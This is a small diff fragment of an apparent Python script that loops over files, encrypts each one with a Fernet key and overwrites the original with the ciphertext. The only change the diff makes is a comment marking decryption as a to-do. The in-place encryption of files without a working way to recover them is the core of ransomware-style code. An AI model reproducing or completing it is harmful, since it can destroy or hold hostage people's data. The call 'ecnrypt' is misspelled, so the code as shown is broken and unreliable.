@@ -26,3 +26,5 @@ for file in files:
     contents_encrypt = Fernet(key).ecnrypt(contents)
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypt)
+        
+#tod-o decryption
